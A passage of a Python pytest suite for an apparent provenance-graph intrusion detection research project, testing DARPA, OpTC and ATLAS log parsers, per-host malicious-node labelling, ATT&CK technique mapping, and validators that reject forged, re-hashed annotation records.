import json
import hashlib
import inspect
import pickle
import subprocess
import sys
from pathlib import Path
from types import SimpleNamespace

import pandas as pd
import numpy as np
import pytest
import torch

ig = pytest.importorskip("igraph")

from scripts.run_detection import (
    SUPPORTED_DATASETS as DETECTION_DATASETS,
    build_split,
    load_augmented_graphs,
    validate_augmentation_mode,
    _initial_split,
)
from scripts.run_augmentation import _build_llm_fn, _region_contains_attack_anchor
from scripts.run_interpretation import (
    HostTacticQueues,
    _mapping_variant_settings,
    _load_detected_nodes,
    _mark_detected,
    _prediction_commit_order,
    _resolve_mapping_registry,
    _serialize_causal_paths,
)
from scripts.recalculate_llm_cost import main as recalculate_llm_cost_main
from scripts.compute_mmd import permutation_mmd
from scripts.evaluate_interpretation import (
    load_ground_truth,
    load_replay_runs,
    score as score_interpretation,
    score_mapping,
    score_sequence_conditions,
    sequence_predictions_from_outputs,
    validate_registry_bindings,
)
from scripts.import_attack_sequence_records import (
    _content_manifest,
    _sha256 as attackseq_sha256,
    convert_grouped_attackseqs,
)
from scripts.import_ground_truth_labels import E5_SOURCE_SHA256, PIDSMaker_COMMIT
from scripts.import_optc_attack_annotations import build as build_optc_attack_annotations
from scripts.validate_artifact import (
    _atlas_attack_technique_schema,
    _atlas_source_linked_registry,
    _canonical_hash as artifact_canonical_hash,
    _darpa_e5_attack_technique_schema,
    _human_ratings,
    _source_linked_technique_schema,
)
from scripts.build_atlas_v1_source_audit import build as build_atlas_v1_source_audit
import scripts.import_atlas_v1_attack_annotations as atlas_attack_importer
from src.augmentation.edge_mutation import (
    _parse_llm_response,
    apply_edge_mutation_llm,
    propose_candidate_new_edges,
)
from src.augmentation.graph_units import build_graph_units
from src.augmentation.semantic_mutation import (
    _assign_strategy,
    _collect_benign_corpus,
    _get_properties,
    _propagate_associated_attributes,
    apply_semantic_mutation_llm,
)
from src.augmentation.structural_mutation import aligned_region_search, subgraph_replacement
from src.augmentation.subgraph_retrieval import _node_initial_label, top_k_similar_attacks
from src.augmentation.verifier import verify_mutation
from src.augmentation.verifier import (
    build_historical_profiles,
    check_attack_chain_fidelity,
    check_attribute_feasibility,
    check_imperceptibility,
    check_operation_legality,
    imperceptibility_coverage,
)
from src.detection.contrastive_learning import ATHENAEncoder, benign_anchor_indices
from src.detection.classifier import MLPClassify
from src.detection.gin_encoder import GINEncoder
from src.detection.node_labels import flatten_node_embeddings, load_malicious_uuids
from src.detection.temporal_encoder import TemporalNodeEncoder
from src.interpretation.attack_subgraph import reconstruct_attack_paths
from src.interpretation.global_alignment import (
    align_candidate_chains,
    build_candidate_tactic_chains,
    load_technique_sequence_records,
)
from src.interpretation.tactic_alignment import load_tactic_sequence_records
from src.snapshot_construction._common import (
    cdm_host_identity,
    collect_label_paths,
    load_optc_released_malicious_uuids_by_host,
    load_released_malicious_uuids,
    normalize_cdm_uuid,
)
from src.snapshot_construction._base import BaseProcessor
from src.snapshot_construction.darpa_e3_parser import (
    DARPAHandler,
    collect_edges_from_log as collect_e3_edges,
)
from src.snapshot_construction.darpa_e5_parser import (
    DARPAHandler5,
    collect_edges_from_log as collect_e5_edges,
)
from src.snapshot_construction.optc_parser import (
    OptcHandler,
    collect_edges_from_log_optc,
    paper_host_from_path,
)
from src.snapshot_construction.atlas_parser import (
    ATLASHandler,
    ATLAS_MULTI_FOLDS,
    ATLAS_SINGLE_FOLDS,
)
from src.snapshot_construction.atlas_v1 import (
    convert_official_case,
    normalize_file_event,
    convert_preprocessed_file,
    discover_preprocessed_files,
    resolve_case_label_ids,
)
from src.utils.split import ATLAS_SPLIT_MODE
from src.utils.interval_replay import (
    _event_dataframe,
    apply_interval_replay,
    canonical_event_row_payload,
    canonical_event_row_sha256,
    event_sha256,
    graph_sha256,
    validate_source_event_window,
)
from src.utils.llm import summarize_llm_calls


def test_released_human_rating_sheet_is_self_consistent():
    path = Path(__file__).resolve().parents[1] / "data" / "human_ratings.csv"
    ok, detail = _human_ratings(path)
    assert ok
    assert detail["rows"] == 3000
    assert detail["model_condition_cells"] == 30
    assert detail["rows_per_cell"] == [100]
    assert detail["overall_alpha_interval"] == 0.83


def test_human_rating_integrity_rejects_score_tampering(tmp_path):
    source = Path(__file__).resolve().parents[1] / "data" / "human_ratings.csv"
    lines = source.read_text(encoding="utf-8").splitlines()
    fields = lines[1].split(",")
    fields[5] = "9"
    lines[1] = ",".join(fields)
    tampered = tmp_path / "human_ratings.csv"
    tampered.write_text("\n".join(lines) + "\n", encoding="utf-8")
    ok, _ = _human_ratings(tampered)
    assert not ok


class _Vertex:
    def __init__(self, **attrs):
        self._attrs = dict(attrs)

    def attributes(self):
        return self._attrs

    def __getitem__(self, key):
        return self._attrs[key]

    def __setitem__(self, key, value):
        self._attrs[key] = value


class _VertexSeq:
    def __init__(self, vertices):
        self._vertices = vertices

    def __iter__(self):
        return iter(self._vertices)

    def __getitem__(self, idx):
        return self._vertices[idx]

    def attributes(self):
        keys = set()
        for v in self._vertices:
            keys.update(v.attributes())
        return list(keys)


class _Graph:
    def __init__(self, vertices):
        self.vs = _VertexSeq(vertices)

    def vcount(self):
        return len(self.vs._vertices)


@pytest.mark.parametrize(
    "path,expected",
    [
        ("/data/H051/events.json", "H051"),
        ("/data/host_0051/events.json", "H051"),
        ("/data/host-0201/events.json", "H201"),
        ("/data/H501/events.json", "H501"),
        ("/data/host_0503/events.json", None),
    ],
)
def test_optc_paper_host_normalization(path, expected):
    assert paper_host_from_path(path) == expected


def test_snapshot_parsers_have_no_benign_line_cap():
    for function in (collect_e3_edges, collect_e5_edges, collect_edges_from_log_optc):
        assert "max_lines" not in inspect.signature(function).parameters
        assert "max_lines" not in inspect.getsource(function)


def test_optc_epoch_milliseconds_form_one_minute_snapshot():
    handler = OptcHandler.__new__(OptcHandler)
    handler.all_labels = []
    handler.labels_by_host = {"H051": set()}
    frame = pd.DataFrame([{
        "actorID": "process-1",
        "actor_type": "SUBJECT_PROCESS",
        "objectID": "file-1",
        "object": "FILE_OBJECT",
        "action": "EVENT_READ",
        "timestamp": "1539120748904",
        "exec": "cmd.exe /c whoami",
        "path": "C:/Windows/System32/whoami.exe",
        "actor_path": "C:/Windows/System32/cmd.exe",
        "object_path": "C:/Windows/System32/whoami.exe",
            "host_id": "H051",
            "host_id_source": "optc_release_filename",
            "source_scene": "0402",
    }])
    snapshots = handler.create_snapshots_from_graph(frame, is_malicious=False)
    assert len(snapshots) == 1
    assert snapshots[0].vcount() == 2


def test_raw_scene_label_files_are_all_collected(tmp_path):
    malicious = tmp_path / "scene" / "malicious"
    malicious.mkdir(parents=True)
    (malicious / "b.txt").write_text("b\n", encoding="utf-8")
    (malicious / "a.txt").write_text("a\n", encoding="utf-8")

    assert collect_label_paths(str(tmp_path))["scene"] == [
        str(malicious / "a.txt"),
        str(malicious / "b.txt"),
    ]


def test_released_labels_feed_snapshot_construction():
    e3 = load_released_malicious_uuids("cadets", "cadets314")
    optc = load_released_malicious_uuids("optcday1")
    expected_optc = set()
    root = Path(__file__).resolve().parents[1] / "data" / "annotated_labels" / "optc" / "malicious_entities"
    for name in ("host_0051.txt", "host_0201.txt", "host_0501.txt"):
        expected_optc.update(
            line.strip() for line in (root / name).read_text(encoding="utf-8").splitlines()
            if line.strip()
        )
    assert e3
    assert optc == expected_optc
    assert load_malicious_uuids("optcday1", "") == expected_optc

    malicious_actor = next(iter(e3))
    handler = DARPAHandler.__new__(DARPAHandler)
    handler.all_labels = list(e3)
    frame = pd.DataFrame([{
        "actorID": malicious_actor,
        "actor_type": "SUBJECT_PROCESS",
        "objectID": "benign-file",
        "object": "FILE_OBJECT",
        "action": "EVENT_WRITE",
        "timestamp": "1704067200000000000",
        "exec": "test-command",
        "path": "/tmp/test",
    }])
    *_unused, graph = handler._build_graph_from_df(frame)
    assert graph.vs.find(name=malicious_actor)["label"] == 1


def test_e5_uses_only_pinned_pidsmaker_platform_registries():
    root = (
        Path(__file__).resolve().parents[1]
        / "data" / "annotated_labels" / "darpa_e5" / "malicious_entities"
    )
    expected = {
        # The two CADETS attacks share two provenance UUIDs; the platform
        # registry intentionally de-duplicates them for node labelling.
        "cadets5": 124,
        "theia5": 69,
        "trace5": 71,
        "clearscope5": 52,
    }
    for dataset, count in expected.items():
        all_labels = load_released_malicious_uuids(dataset)
        assert len(all_labels) == count
        assert load_released_malicious_uuids(dataset, "arbitrary-scene-filter") == all_labels
        assert load_malicious_uuids(dataset, "arbitrary-scene-filter") == all_labels
    assert "00000000-0000-0000-0000-000000000000" not in load_malicious_uuids("theia5", "")
    assert not {
        "cadets93.txt", "cadets104.txt", "theia74.txt", "theia76.txt", "theia86.txt",
    }.intersection(path.name for path in root.glob("*.txt"))
    assert "collect_label_paths" not in inspect.getsource(DARPAHandler5.load)
    manifest = json.loads((root / "content_manifest.json").read_text(encoding="utf-8"))
    observed_source_hashes = {
        str(row["source_path"]).split("Ground_Truth/orthrus/", 1)[-1]: row["source_sha256"]
        for row in manifest["sources"]
    }
    assert observed_source_hashes == E5_SOURCE_SHA256


def test_e5_exact_attack_registry_preserves_raw_and_graph_event_namespaces():
    root = (
        Path(__file__).resolve().parents[1]
        / "data/annotated_labels/darpa_e5/attack_techniques"
    )
    ok, detail = _darpa_e5_attack_technique_schema(root)
    assert ok, detail
    evidence = [
        json.loads(line) for line in (root / "source_records.jsonl").read_text().splitlines()
        if line.strip()
    ]
    assert len(evidence) == 6
    assert sum(row["raw_event"]["graph_event_id"].endswith(":predicateObject2") for row in evidence) == 1
    for row in evidence:
        raw = row["raw_event"]
        endpoint = "predicateObject2" if row["anchor"]["role"] == "object2" else "predicateObject"
        assert raw["graph_event_id"] == f"{raw['raw_event_uuid']}:{endpoint}"
        assert raw["event_id"] == raw["graph_event_id"]
    assert normalize_cdm_uuid("89e6049e9653c1c2b0addb11aacb3bc4") == (
        "89E6049E-9653-C1C2-B0AD-DB11AACB3BC4"
    )


def test_e5_validator_rejects_self_consistent_raw_event_identity_forgery(tmp_path):
    source = (
        Path(__file__).resolve().parents[1]
        / "data/annotated_labels/darpa_e5/attack_techniques"
    )
    target = tmp_path / "attack_techniques"
    target.mkdir()
    for path in source.iterdir():
        if path.is_file():
            (target / path.name).write_bytes(path.read_bytes())

    evidence_path = target / "source_records.jsonl"
    annotations_path = target / "source_linked_annotations.jsonl"
    mappings_path = target / "mapping_records.jsonl"
    evidence = [json.loads(line) for line in evidence_path.read_text().splitlines() if line.strip()]
    annotations = [json.loads(line) for line in annotations_path.read_text().splitlines() if line.strip()]
    mappings = [json.loads(line) for line in mappings_path.read_text().splitlines() if line.strip()]

    changed = evidence[0]
    annotation_id = changed["annotation_id"]
    forged_raw_uuid = "AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA"
    endpoint = changed["raw_event"]["graph_event_id"].split(":", 1)[1]
    forged_graph_id = f"{forged_raw_uuid}:{endpoint}"
    changed["raw_event"]["raw_event_uuid"] = forged_raw_uuid
    changed["raw_event"]["event_id"] = forged_graph_id
    changed["raw_event"]["graph_event_id"] = forged_graph_id
    claimed_input_pin = changed["input_record_sha256"]
    payload = dict(changed)
    payload.pop("record_sha256")
    changed["record_sha256"] = artifact_canonical_hash(payload)
    evidence_path.write_text(
        "".join(json.dumps(row, sort_keys=True) + "\n" for row in evidence), encoding="utf-8",
    )
    evidence_sha = hashlib.sha256(evidence_path.read_bytes()).hexdigest()

    annotation = next(row for row in annotations if row["annotation_id"] == annotation_id)
    annotation["event_id"] = forged_graph_id
    annotation["raw_event_uuid"] = forged_raw_uuid
    annotation["source_hash"] = evidence_sha
    annotation["source_record_sha256"] = changed["record_sha256"]
    annotation["source_locator"]["raw_event_id"] = forged_raw_uuid
    annotation["source_locator"]["graph_event_id"] = forged_graph_id
    annotations_path.write_text(
        "".join(json.dumps(row, sort_keys=True) + "\n" for row in annotations), encoding="utf-8",
    )

    mapping = next(row for row in mappings if row["source_id"] == annotation_id)
    mapping["source_hash"] = evidence_sha
    mapping["source_record_sha256"] = changed["record_sha256"]
    mapping["boundary"]["event_id"] = forged_graph_id
    mapping["boundary"]["raw_event_uuid"] = forged_raw_uuid
    mappings_path.write_text(
        "".join(json.dumps(row, sort_keys=True) + "\n" for row in mappings), encoding="utf-8",
    )

    manifest_path = target / "content_manifest.json"
    manifest = json.loads(manifest_path.read_text())
    manifest["outputs"]["source_records.jsonl"] = evidence_sha
    manifest["outputs"]["source_linked_annotations.jsonl"] = hashlib.sha256(
        annotations_path.read_bytes()
    ).hexdigest()
    manifest["outputs"]["mapping_records.jsonl"] = hashlib.sha256(
        mappings_path.read_bytes()
    ).hexdigest()
    manifest.pop("aggregate_sha256")
    manifest["aggregate_sha256"] = artifact_canonical_hash(manifest)
    manifest_path.write_text(json.dumps(manifest, indent=2, sort_keys=True) + "\n", encoding="utf-8")

    assert changed["input_record_sha256"] == claimed_input_pin
    ok, _detail = _darpa_e5_attack_technique_schema(target)
    assert not ok


@pytest.mark.parametrize("anchor_role", ["object", "object2"])
def test_e5_portable_mapping_resolves_handler_endpoint_and_runtime_scene(tmp_path, anchor_role):
    root = (
        Path(__file__).resolve().parents[1]
        / "data/annotated_labels/darpa_e5/attack_techniques"
    )
    mappings = [
        json.loads(line) for line in (root / "mapping_records.jsonl").read_text().splitlines()
        if line.strip()
    ]
    row = next(item for item in mappings if item["boundary"]["anchor_role"] == anchor_role)
    row["source_record"] = str((root / "source_records.jsonl").resolve())
    registry = tmp_path / "one-e5-mapping.jsonl"
    registry.write_text(json.dumps(row) + "\n", encoding="utf-8")
    boundary = row["boundary"]

    graph = ig.Graph(directed=True)
    graph.add_vertices(2)
    graph.vs["name"] = [boundary["actor"], boundary["object"]]
    graph.vs["type"] = ["process", "netflow"]
    graph.vs["properties"] = ["actor", "endpoint"]
    graph.vs["label"] = [1, int(boundary["anchor"] == boundary["object"])]
    graph.add_edge(0, 1)
    graph.es["event_id"] = [boundary["event_id"]]
    graph.es["actions"] = [boundary["action"]]
    graph.es["timestamp"] = [pd.to_datetime(boundary["timestamp"], utc=True).timestamp()]
    graph.es["event_order"] = [0]
    graph["source_scene"] = "local-handler-scene-name"
    graph["host_id"] = row["host_id"]

    resolved = _resolve_mapping_registry(
        registry, SimpleNamespace(snapshots=[graph]), row["dataset"], "different-cli-scene",
    )
    assert len(resolved) == 1
    assert resolved[0]["scene"] == "local-handler-scene-name"
    assert resolved[0]["boundary"]["event_id"] == boundary["event_id"]
    assert resolved[0]["boundary"]["event_sha256"] == event_sha256(graph, 0)


def test_e5_wildcard_ground_truth_scores_against_resolved_runtime_scene(tmp_path):
    root = (
        Path(__file__).resolve().parents[1]
        / "data/annotated_labels/darpa_e5/attack_techniques"
    )
    row = json.loads((root / "mapping_records.jsonl").read_text().splitlines()[0])
    row["source_record"] = str((root / "source_records.jsonl").resolve())
    registry = tmp_path / "one-e5-truth.jsonl"
    registry.write_text(json.dumps(row) + "\n", encoding="utf-8")
    truth = load_ground_truth(registry)
    interps = []
    for variant in ("direct", "tech-enhanced", "log-enhanced", "full-enhanced"):
        interps.append({
            "dataset": row["dataset"],
            "mapping_variant": variant,
            "final_mapping_predictions": [{
                "source_scene": "runtime-scene",
                "host_id": row["host_id"],
                "anchor_uuid": row["anchor_uuid"],
                "boundary_snapshot": 3,
                "boundary_event_id": row["boundary"]["event_id"],
                "boundary_event_sha256": "a" * 64,
                "source_id": row["source_id"],
                "top_k_candidates": [{
                    "technique": row["reference_technique"],
                    "tactics": [row["reference_tactic"]],
                }],
            }],
        })
    scored = score_mapping(interps, truth, top_ks=(1,))
    assert scored["records_per_variant"] == 1
    assert all(scored["variants"][variant]["1"]["Acc"] == 1 for variant in scored["variants"])


def test_pidsmaker_optc_registry_has_exact_paper_host_sets():
    root = Path(__file__).resolve().parents[1] / "data" / "annotated_labels" / "optc" / "malicious_entities"
    manifest = json.loads((root / "content_manifest.json").read_text(encoding="utf-8"))
    labels_by_host = load_optc_released_malicious_uuids_by_host()

    assert manifest["source_commit"] == PIDSMaker_COMMIT
    assert {host: len(values) for host, values in labels_by_host.items()} == {
        "H051": 114, "H201": 2905, "H501": 749,
    }
    assert {path.name for path in root.glob("host_*.txt")} == {
        "host_0051.txt", "host_0201.txt", "host_0501.txt",
    }
    rows = [json.loads(line) for line in (root / "entities.jsonl").read_text(encoding="utf-8").splitlines()]
    assert len(rows) == 3768
    assert all(row["id_namespace"] == "optc.actor_or_object.uuid" for row in rows)
    assert all("pidsmaker_export_index" in row and "event_id" not in row for row in rows)


def test_optc_portable_mapping_records_resolve_exact_event_and_anchor(tmp_path):
    root = Path(__file__).resolve().parents[1] / "data" / "annotated_labels" / "optc" / "attack_techniques"
    registry = root / "mapping_records.jsonl"
    rows = load_ground_truth(registry)
    assert len(rows) == 27
    assert all(row["record_type"] == "mapping" for row in rows)

    row = dict(rows[0])
    row["source_record"] = str((root / "source_records.jsonl").resolve())
    one = tmp_path / "one-mapping.jsonl"
    one.write_text(json.dumps(row) + "\n", encoding="utf-8")
    boundary = row["boundary"]
    graph = ig.Graph(directed=True)
    graph.add_vertices(2)
    graph.vs["name"] = [boundary["actor"], boundary["object"]]
    graph.vs["type"] = ["process", "file"]
    graph.vs["properties"] = ["powershell.exe", "registry"]
    graph.vs["label"] = [1, 0]
    graph.vs["_athena_temporal_id"] = [
        f"{row['host_id']}:{boundary['actor']}",
        f"{row['host_id']}:{boundary['object']}",
    ]
    graph.add_edge(0, 1)
    graph.es["event_id"] = [boundary["event_id"]]
    graph.es["actions"] = [boundary["action"]]
    graph.es["timestamp"] = [pd.to_datetime(boundary["timestamp"], utc=True).timestamp()]
    graph.es["event_order"] = [0]
    graph["source_scene"] = row["scene"]
    graph["host_id"] = row["host_id"]

    resolved = _resolve_mapping_registry(
        one, SimpleNamespace(snapshots=[graph]), "optcday1", row["scene"],
    )
    assert len(resolved) == 1
    assert resolved[0]["boundary"]["snapshot"] == 0
    assert resolved[0]["boundary"]["event_id"] == boundary["event_id"]
    assert resolved[0]["boundary"]["event_sha256"] == event_sha256(graph, 0)


def _copy_optc_attack_bundle(destination: Path) -> Path:
    source = (
        Path(__file__).resolve().parents[1]
        / "data/annotated_labels/optc/attack_techniques"
    )
    destination.mkdir()
    for name in (
        "source_records.jsonl",
        "source_linked_annotations.jsonl",
        "mapping_records.jsonl",
        "content_manifest.json",
    ):
        (destination / name).write_bytes((source / name).read_bytes())
    return destination


def _resign_optc_bundle_manifest(root: Path) -> None:
    manifest_path = root / "content_manifest.json"
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    manifest["outputs"] = {
        name: hashlib.sha256((root / name).read_bytes()).hexdigest()
        for name in (
            "source_records.jsonl",
            "source_linked_annotations.jsonl",
            "mapping_records.jsonl",
        )
    }
    manifest.pop("aggregate_sha256", None)
    manifest["aggregate_sha256"] = artifact_canonical_hash(manifest)
    manifest_path.write_text(
        json.dumps(manifest, ensure_ascii=False, indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )


def _reconstruct_optc_import_candidates(root: Path) -> list[dict]:
    evidence = [
        json.loads(line)
        for line in (root / "source_records.jsonl").read_text().splitlines()
        if line.strip()
    ]
    annotations = {
        row["source_record_sha256"]: row
        for row in (
            json.loads(line)
            for line in (root / "source_linked_annotations.jsonl").read_text().splitlines()
            if line.strip()
        )
    }
    candidates = []
    for row in evidence:
        raw = row["raw_event"]
        anchor = row["anchor"]
        annotation = annotations[row["record_sha256"]]
        candidate_raw = {
            key: raw[key]
            for key in (
                "event_id", "timestamp", "hostname", "actorID", "objectID",
                "action", "object", "relevant_properties",
            )
        }
        candidate_raw["source"] = {
            "zip_sha256": raw["archive_sha256"],
            "record_sha256": raw["source_record_sha256"],
            "line": raw["source_record_number"],
        }
        candidate_raw["matching_pids_anchors"] = [{
            "role": anchor["role"],
            "anchors": [{
                "pidsmaker_path": anchor["source_path"],
                "pidsmaker_file_sha256": anchor["source_file_sha256"],
                "line": anchor["source_row"],
                "record_sha256": anchor["source_record_sha256"],
                "node_kind": anchor["node_kind"],
                "node_description": anchor["node_description"],
                "pidsmaker_legacy_index": anchor["pidsmaker_export_index"],
            }],
        }]
        candidates.append({
            "task_id": row["task_id"],
            "official_log_text": row["official_log_text"],
            "task_source": {
                "zip_sha256": row["task_source"]["archive_sha256"],
                "task_record_sha256": row["task_record_sha256"],
                "task_index": row["task_source"]["task_index"],
            },
            "raw_event": candidate_raw,
            "timestamp": raw["timestamp"],
            "hostname": raw["hostname"],
            "dataset": annotation["source_partition"],
        })
    return candidates


def test_optc_importer_pins_complete_reviewed_evidence(tmp_path):
    source = (
        Path(__file__).resolve().parents[1]
        / "data/annotated_labels/optc/attack_techniques"
    )
    candidates = _reconstruct_optc_import_candidates(source)
    candidates_path = tmp_path / "candidates.jsonl"
    candidates_path.write_text(
        "".join(json.dumps(row, sort_keys=True) + "\n" for row in candidates),
        encoding="utf-8",
    )
    output = tmp_path / "rebuilt"
    build_optc_attack_annotations(candidates_path, output)
    assert _source_linked_technique_schema(output)

    candidates[0]["official_log_text"] += " [self-consistent rewrite]"
    candidates_path.write_text(
        "".join(json.dumps(row, sort_keys=True) + "\n" for row in candidates),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="complete evidence record changed"):
        build_optc_attack_annotations(candidates_path, tmp_path / "forged")


def test_optc_artifact_validator_binds_mapping_event_hash_to_evidence(tmp_path):
    source = Path(__file__).resolve().parents[1] / "data" / "annotated_labels" / "optc" / "attack_techniques"
    assert _source_linked_technique_schema(source)
    target = tmp_path / "attack_techniques"
    target.mkdir()
    for name in (
        "source_records.jsonl",
        "source_linked_annotations.jsonl",
        "mapping_records.jsonl",
        "content_manifest.json",
    ):
        (target / name).write_bytes((source / name).read_bytes())

    mapping_path = target / "mapping_records.jsonl"
    rows = [json.loads(line) for line in mapping_path.read_text(encoding="utf-8").splitlines()]
    rows[0]["boundary"]["source_event_sha256"] = "f" * 64
    mapping_path.write_text(
        "".join(json.dumps(row, ensure_ascii=False, sort_keys=True) + "\n" for row in rows),
        encoding="utf-8",
    )

    manifest_path = target / "content_manifest.json"
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    manifest["outputs"]["mapping_records.jsonl"] = hashlib.sha256(mapping_path.read_bytes()).hexdigest()
    manifest.pop("aggregate_sha256", None)
    manifest["aggregate_sha256"] = artifact_canonical_hash(manifest)
    manifest_path.write_text(json.dumps(manifest, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")

    assert not _source_linked_technique_schema(target)


def test_optc_artifact_validator_rejects_self_consistent_selected_source_rewrite(tmp_path):
    source = Path(__file__).resolve().parents[1] / "data/annotated_labels/optc/attack_techniques"
    target = tmp_path / "attack_techniques"
    target.mkdir()
    for name in (
        "source_records.jsonl", "source_linked_annotations.jsonl",
        "mapping_records.jsonl", "content_manifest.json",
    ):
        (target / name).write_bytes((source / name).read_bytes())
    evidence_path = target / "source_records.jsonl"
    annotation_path = target / "source_linked_annotations.jsonl"
    mapping_path = target / "mapping_records.jsonl"
    manifest_path = target / "content_manifest.json"
    evidence = [json.loads(line) for line in evidence_path.read_text().splitlines()]
    old_hash = evidence[0]["record_sha256"]
    evidence[0]["raw_event"]["source_record_sha256"] = "f" * 64
    payload = dict(evidence[0])
    payload.pop("record_sha256")
    evidence[0]["record_sha256"] = artifact_canonical_hash(payload)
    evidence_path.write_text("".join(json.dumps(row, sort_keys=True) + "\n" for row in evidence))
    evidence_sha = hashlib.sha256(evidence_path.read_bytes()).hexdigest()
    annotations = [json.loads(line) for line in annotation_path.read_text().splitlines()]
    for row in annotations:
        row["source_hash"] = evidence_sha
        if row["source_record_sha256"] == old_hash:
            row["source_record_sha256"] = evidence[0]["record_sha256"]
    annotation_path.write_text("".join(json.dumps(row, sort_keys=True) + "\n" for row in annotations))
    mappings = [json.loads(line) for line in mapping_path.read_text().splitlines()]
    for row in mappings:
        row["source_hash"] = evidence_sha
        if row["source_record_sha256"] == old_hash:
            row["source_record_sha256"] = evidence[0]["record_sha256"]
            row["boundary"]["source_event_sha256"] = "f" * 64
    mapping_path.write_text("".join(json.dumps(row, sort_keys=True) + "\n" for row in mappings))
    manifest = json.loads(manifest_path.read_text())
    manifest["outputs"] = {
        evidence_path.name: evidence_sha,
        annotation_path.name: hashlib.sha256(annotation_path.read_bytes()).hexdigest(),
        mapping_path.name: hashlib.sha256(mapping_path.read_bytes()).hexdigest(),
    }
    manifest.pop("aggregate_sha256")
    manifest["aggregate_sha256"] = artifact_canonical_hash(manifest)
    manifest_path.write_text(json.dumps(manifest))

    assert not _source_linked_technique_schema(target)


def test_optc_validator_rejects_self_consistent_official_log_text_rewrite(tmp_path):
    source = (
        Path(__file__).resolve().parents[1]
        / "data/annotated_labels/optc/attack_techniques"
    )
    assert _source_linked_technique_schema(source)
    target = _copy_optc_attack_bundle(tmp_path / "attack_techniques")
    evidence_path = target / "source_records.jsonl"
    annotation_path = target / "source_linked_annotations.jsonl"
    mapping_path = target / "mapping_records.jsonl"

    evidence = [json.loads(line) for line in evidence_path.read_text().splitlines()]
    changed = evidence[0]
    old_record_hash = changed["record_sha256"]
    changed["official_log_text"] = f"{changed['official_log_text']} [self-consistent rewrite]"
    payload = dict(changed)
    payload.pop("record_sha256")
    changed["record_sha256"] = artifact_canonical_hash(payload)
    evidence_path.write_text(
        "".join(json.dumps(row, sort_keys=True) + "\n" for row in evidence),
        encoding="utf-8",
    )
    evidence_hash = hashlib.sha256(evidence_path.read_bytes()).hexdigest()

    annotations = [json.loads(line) for line in annotation_path.read_text().splitlines()]
    for row in annotations:
        row["source_hash"] = evidence_hash
        if row["source_record_sha256"] == old_record_hash:
            row["source_record_sha256"] = changed["record_sha256"]
    annotation_path.write_text(
        "".join(json.dumps(row, sort_keys=True) + "\n" for row in annotations),
        encoding="utf-8",
    )
    mappings = [json.loads(line) for line in mapping_path.read_text().splitlines()]
    for row in mappings:
        row["source_hash"] = evidence_hash
        if row["source_record_sha256"] == old_record_hash:
            row["source_record_sha256"] = changed["record_sha256"]
    mapping_path.write_text(
        "".join(json.dumps(row, sort_keys=True) + "\n" for row in mappings),
        encoding="utf-8",
    )
    _resign_optc_bundle_manifest(target)

    assert not _source_linked_technique_schema(target)


def test_optc_validator_rejects_self_consistent_technique_tactic_rewrite(tmp_path):
    source = (
        Path(__file__).resolve().parents[1]
        / "data/annotated_labels/optc/attack_techniques"
    )
    assert _source_linked_technique_schema(source)
    target = _copy_optc_attack_bundle(tmp_path / "attack_techniques")
    annotation_path = target / "source_linked_annotations.jsonl"
    mapping_path = target / "mapping_records.jsonl"
    annotations = [json.loads(line) for line in annotation_path.read_text().splitlines()]
    changed = annotations[0]
    replacement = (
        ("T1113", "Collection")
        if changed["reference_technique"] != "T1113"
        else ("T1057", "Discovery")
    )
    changed["reference_technique"], changed["reference_tactic"] = replacement
    changed["valid_tactics"] = [replacement[1]]
    annotation_path.write_text(
        "".join(json.dumps(row, sort_keys=True) + "\n" for row in annotations),
        encoding="utf-8",
    )
    mappings = [json.loads(line) for line in mapping_path.read_text().splitlines()]
    mapping = next(row for row in mappings if row["source_id"] == changed["source_id"])
    mapping["reference_technique"], mapping["reference_tactic"] = replacement
    mapping_path.write_text(
        "".join(json.dumps(row, sort_keys=True) + "\n" for row in mappings),
        encoding="utf-8",
    )
    _resign_optc_bundle_manifest(target)

    assert not _source_linked_technique_schema(target)


def test_optc_graph_labels_are_isolated_by_host():
    malicious_uuid = "same-uuid-on-two-hosts"
    handler = OptcHandler.__new__(OptcHandler)
    handler.labels_by_host = {"H051": {malicious_uuid}, "H201": set(), "H501": set()}

    def frame(host):
        return pd.DataFrame([{
            "actorID": malicious_uuid,
            "actor_type": "SUBJECT_PROCESS",
            "objectID": f"file-{host}",
            "object": "FILE_OBJECT",
            "action": "EVENT_READ",
            "timestamp": "1539120748904",
            "timestamp_dt": pd.Timestamp("2018-10-10T00:12:28.904Z"),
            "exec": "cmd.exe /c whoami",
            "path": "C:/Windows/System32/whoami.exe",
            "host_id": host,
            "source_scene": "day1",
        }])

    *_, h051 = handler._build_graph_from_df(frame("H051"))
    *_, h201 = handler._build_graph_from_df(frame("H201"))
    assert h051.vs.find(name=malicious_uuid)["label"] == 1
    assert h201.vs.find(name=malicious_uuid)["label"] == 0


def test_flattened_labels_can_follow_snapshot_scope():
    embeddings = [
        {"shared": np.asarray([1.0], dtype=np.float32)},
        {"shared": np.asarray([2.0], dtype=np.float32)},
    ]
    _x, labels, _uuids, _snapshots = flatten_node_embeddings(
        embeddings,
        malicious_uuids={"shared"},
        snapshot_malicious_uuids=[{"shared"}, set()],
    )
    assert labels.tolist() == [1, 0]


def test_e3_snapshot_properties_do_not_use_corpus_wide_future_maps():
    handler = DARPAHandler.__new__(DARPAHandler)
    handler.all_labels = []
    handler.all_netobj2pro = {"proc": "future-network-value"}
    handler.all_subject2pro = {"proc": "future-command,,/future/path"}
    handler.all_file2pro = {"file": "/future/file"}
    frame = pd.DataFrame([{
        "actorID": "proc",
        "actor_type": "SUBJECT_PROCESS",
        "objectID": "file",
        "object": "FILE_OBJECT",
        "action": "EVENT_WRITE",
        "timestamp": "1704067200000000000",
        "exec": "current-command --safe",
        "path": "/current/file",
    }])

    *_unused, graph = handler._build_graph_from_df(frame)
    properties = " ".join(graph.vs["properties"])
    assert "current-command" in properties
    assert "/current/file" in properties
    assert "future-command" not in properties
    assert "/future/file" not in properties


def test_snapshot_graph_preserves_typed_parallel_event_edges():
    handler = DARPAHandler.__new__(DARPAHandler)
    handler.all_labels = []
    frame = pd.DataFrame([
        {
            "actorID": "proc",
            "actor_type": "SUBJECT_PROCESS",
            "objectID": "file",
            "object": "FILE_OBJECT",
            "action": "EVENT_READ",
            "timestamp": "1704067200000000000",
            "event_id": "z-source-first",
            "exec": "/bin/cat",
